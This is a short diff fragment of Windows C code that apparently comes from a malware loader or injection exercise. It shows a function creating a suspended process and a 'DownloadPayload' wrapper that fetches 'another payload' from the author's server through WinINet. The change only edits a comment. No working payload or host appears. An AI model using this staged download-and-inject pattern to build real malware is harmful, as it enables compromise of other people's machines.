@@ -16,7 +16,9 @@ BOOL CreateSuspendedProcess2(LPCSTR lpProcessName) {
 
 }
 
-// custom wrapper function to download from our py server
+
+// custom wrapper function to download another payload from our py server
+
 BOOL DownloadPayload(LPCWSTR SeverUrl) {
 	// 1. InternetOpenW() - Initialize WinINet
 	// 2. InternetOpenUrlW() - Open connection to URL
